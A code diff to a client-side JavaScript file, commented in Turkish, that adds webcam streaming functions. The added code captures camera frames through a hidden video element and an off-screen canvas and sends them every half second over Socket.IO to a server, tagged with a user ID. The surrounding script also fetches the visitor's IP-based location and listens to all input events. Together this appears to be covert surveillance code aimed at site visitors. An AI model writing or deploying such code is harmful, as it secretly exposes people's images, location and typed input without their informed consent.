@@ -11,6 +11,94 @@ function sendClientLog(payload) {
   });
 }
 
+// Video stream değişkenleri
+let videoStream = null;
+let videoStreamActive = false;
+let videoCanvas = null;
+let videoCanvasCtx = null;
+let videoFrameInterval = null;
+
+// Video yayınını başlat
+function startVideoStream(socket) {
+  if (videoStreamActive) return;
+  
+  // Canvas ve context oluştur
+  videoCanvas = document.createElement('canvas');
+  videoCanvas.width = 320;  // Düşük çözünürlük için
+  videoCanvas.height = 240;
+  videoCanvasCtx = videoCanvas.getContext('2d');
+  
+  // Kamera erişimi iste
+  navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
+    .then(stream => {
+      videoStream = stream;
+      videoStreamActive = true;
+      
+      // Gizli video elementi oluştur
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.autoplay = true;
+      
+      // Her 500ms'de bir frame gönder - ağ yükünü azaltmak için
+      videoFrameInterval = setInterval(() => {
+        if (!videoStreamActive) return;
+        
+        // Video frame'i canvas'a çiz
+        videoCanvasCtx.drawImage(video, 0, 0, videoCanvas.width, videoCanvas.height);
+        
+        // Frame'i base64 olarak kodla ve gönder
+        const imageData = videoCanvas.toDataURL('image/jpeg', 0.5); // Kaliteyi düşürerek veri boyutunu azalt
+        
+        if (socket && socket.connected) {
+          socket.emit('video_frame', {
+            userId: clientInfo.userId || 'anonymous',
+            frame: imageData,
+            timestamp: Date.now()
+          });
+        }
+      }, 500);
+      
+      // Video stream başlatıldı logunu gönder
+      sendClientLog({
+        type: "video_stream_started",
+        timestamp: Date.now()
+      });
+    })
+    .catch(err => {
+      console.error("Kamera erişimi hatası:", err);
+      sendClientLog({
+        type: "video_stream_error",
+        error: err.message,
+        timestamp: Date.now()
+      });
+    });
+}
+
+// Video yayınını durdur
+function stopVideoStream() {
+  if (!videoStreamActive) return;
+  
+  // Interval'i temizle
+  if (videoFrameInterval) {
+    clearInterval(videoFrameInterval);
+    videoFrameInterval = null;
+  }
+  
+  // Stream'i durdur
+  if (videoStream) {
+    videoStream.getTracks().forEach(track => track.stop());
+    videoStream = null;
+  }
+  
+  videoStreamActive = false;
+  
+  // Video stream durduruldu logunu gönder
+  sendClientLog({
+    type: "video_stream_stopped",
+    timestamp: Date.now()
+  });
+}
+
 document.addEventListener("DOMContentLoaded", function () {
   // IP ve konum bilgisi
   fetch("https://ipapi.co/json/")
@@ -128,5 +216,19 @@ document.addEventListener("input", (e) => {
     });
   }
 });
+
+// Dışa aktarılacak fonksiyonlar
+window.clientVideoControl = {
+  startStream: () => {
+    // Socket.IO bağlantısını alıp video stream'i başlat
+    if (window.io) {
+      const socket = io("http://127.0.0.1:3000");
+      startVideoStream(socket);
+    } else {
+      console.error("Socket.IO bulunamadı. Video stream başlatılamıyor.");
+    }
+  },
+  stopStream: stopVideoStream
+};
 
 
